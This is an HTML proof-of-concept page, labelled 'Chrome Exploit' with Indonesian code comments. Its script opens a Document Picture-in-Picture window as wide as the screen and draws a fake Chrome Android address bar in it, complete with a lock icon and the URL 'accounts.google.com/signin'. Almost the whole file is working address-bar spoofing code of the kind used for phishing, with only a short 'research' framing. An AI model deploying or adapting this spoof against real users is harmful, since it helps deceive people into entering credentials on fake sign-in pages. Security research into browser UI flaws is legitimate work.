<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Chrome Security Lab - FARISSAL B</title>
    <style>
        body { 
            margin: 0; background: #121212; color: #fff; font-family: sans-serif; 
            display: flex; align-items: center; justify-content: center; height: 100vh; 
        }
        .card { 
            background: #1e1e1e; padding: 30px; border-radius: 20px; 
            border: 1px solid #333; width: 85%; text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        #startBtn { 
            background: #8ab4f8; color: #202124; border: none; padding: 18px; 
            border-radius: 50px; font-weight: bold; width: 100%; font-size: 16px;
            cursor: pointer;
        }
        .status { 
            margin-top: 20px; font-family: monospace; font-size: 11px; color: #81c995; 
            text-align: left; background: #000; padding: 10px; border-radius: 10px;
        }
    </style>
</head>
<body>

<div class="card">
    <h2 style="color: #8ab4f8; margin-top: 0;">Chrome Exploit</h2>
    <p style="color: #9aa0a6; font-size: 13px;">Target: Address Bar Redressing (Android)</p>
    
    <button id="startBtn">START RESEARCH SESSION</button>
    
    <div id="log" class="status">> Ready for HTTPS execution...</div>
</div>

<script>
    const log = document.getElementById('log');
    const addLog = (m) => { log.innerHTML += `<br>> ${m}`; log.scrollTop = log.scrollHeight; };

    document.getElementById('startBtn').addEventListener('click', async () => {
        addLog("Requesting PiP Window...");

        try {
            // Meminta PiP Window (Wajib HTTPS agar tidak error)
            const pipWin = await documentPictureInPicture.requestWindow({
                width: window.screen.width,
                height: 150
            });

            addLog("SUCCESS: PiP Active!");

            // Desain Bar Alamat Palsu (Warna & Font Mirip Chrome Android Asli)
            pipWin.document.body.style.margin = "0";
            pipWin.document.body.style.padding = "0";
            pipWin.document.body.style.overflow = "hidden";
            pipWin.document.body.style.background = "#ffffff";

            pipWin.document.body.innerHTML = `
                <div style="height: 100vh; display: flex; align-items: center; padding: 0 16px; border-bottom: 1px solid #dadce0; font-family: sans-serif;">
                    <div style="background-color: #f1f3f4; border-radius: 24px; padding: 10px 20px; width: 100%; display: flex; align-items: center; gap: 12px;">
                        <span style="font-size: 18px;">🔒</span>
                        <span style="color: #202124; font-size: 15px; font-weight: 400;">accounts.google.com/signin</span>
                        <span style="margin-left: auto; color: #5f6368; font-size: 16px;">⋮</span>
                    </div>
                </div>
            `;

        } catch (err) {
            addLog("ERROR: " + err.message);
            alert("Error: " + err.message + "\n\nSal, pastiin lo buka link HTTPS!");
        }
    });
</script>

</body>
</html>
